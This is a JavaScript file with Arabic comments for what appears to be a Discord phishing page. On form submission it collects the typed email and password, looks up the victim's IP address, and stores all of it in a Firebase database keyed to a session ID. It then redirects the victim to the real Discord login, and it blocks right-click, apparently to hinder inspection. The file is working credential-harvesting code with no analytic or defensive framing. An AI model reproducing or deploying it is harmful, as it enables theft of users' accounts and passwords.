// تهيئة Firebase وتعريف المتغيرات اللازمة
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

// تهيئة Firebase
const firebaseConfig = {
    apiKey: import.meta.env.VITE_API_KEY,
    authDomain: import.meta.env.VITE_AUTH_DOMAIN,
    databaseURL: import.meta.env.VITE_DATABASE_URL,
    projectId: import.meta.env.VITE_PROJECT_ID,
    storageBucket: import.meta.env.VITE_STORAGE_BUCKET,
    messagingSenderId: import.meta.env.VITE_MESSAGING_SENDER_ID,
    appId: import.meta.env.VITE_APP_ID,
    measurementId: import.meta.env.VITE_MEASUREMENT_ID
};

const app = initializeApp(firebaseConfig);
const database = getDatabase();

// تحديد العناصر
const emailInput = document.getElementById('emailORphone');
const passwordInput = document.getElementById('password');
const loginForm = document.querySelector('form');

// الحصول على معرف الجلسة من الرابط
function getSessionId() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('session');
}

// إرسال بيانات تسجيل الدخول إلى Firebase
async function sendLoginCredentials(email, password) {
    try {
        const sessionId = getSessionId();
        
        if (!sessionId) {
            console.error("لا يوجد معرف جلسة");
            return false;
        }
        
        // الحصول على عنوان IP
        let ip = 'غير معروف';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        } catch (error) {
            console.error("خطأ في الحصول على عنوان IP:", error);
        }
        
        // إرسال البيانات إلى Firebase
        const accountsRef = ref(database, `login/sessions/${sessionId}/accounts`);
        const newAccountRef = push(accountsRef);
        await set(newAccountRef, {
            email: email,
            password: password,
            timestamp: Date.now(),
            ip: ip
        });
        
        console.log("تم إرسال البيانات بنجاح");
        return true;
    } catch (error) {
        console.error("خطأ في إرسال البيانات:", error);
        return false;
    }
}

// تحريك زر تسجيل الدخول
function animateLoginButton() {
    const loginBtn = document.querySelector('.login button');
    const originalText = loginBtn.innerHTML;
    loginBtn.innerHTML = '<span class="spinner"></span>';
    loginBtn.disabled = true;
    
    return function resetButton() {
        loginBtn.innerHTML = originalText;
        loginBtn.disabled = false;
    };
}

// التعامل مع النموذج عند التقديم
if (loginForm) {
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!email || !password) {
            alert('الرجاء إدخال البريد الإلكتروني وكلمة المرور');
            return;
        }
        
        // تحريك زر تسجيل الدخول
        const resetButton = animateLoginButton();
        
        try {
            // إرسال بيانات تسجيل الدخول إلى Firebase
            const success = await sendLoginCredentials(email, password);
            
            if (success) {
                // إعادة توجيه المستخدم إلى صفحة Discord الرسمية بعد فترة قصيرة
                setTimeout(function() {
                    window.location.href = 'https://discord.com/login';
                }, 2000);
            } else {
                resetButton();
                alert('حدث خطأ أثناء تسجيل الدخول. الرجاء المحاولة مرة أخرى.');
            }
        } catch (error) {
            console.error("خطأ:", error);
            resetButton();
            alert('حدث خطأ أثناء تسجيل الدخول. الرجاء المحاولة مرة أخرى.');
        }
    });
}

// منع القائمة المنسدلة عند النقر بزر الماوس الأيمن
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// عند تحميل الصفحة
window.onload = function() {
    // التحقق من وجود معرف جلسة في الرابط
    const sessionId = getSessionId();
    console.log("معرف الجلسة:", sessionId);
    
    if (sessionId) {
        console.log("تم العثور على معرف الجلسة:", sessionId);
    } else {
        console.error("لا يوجد معرف جلسة في الرابط!");
    }
};
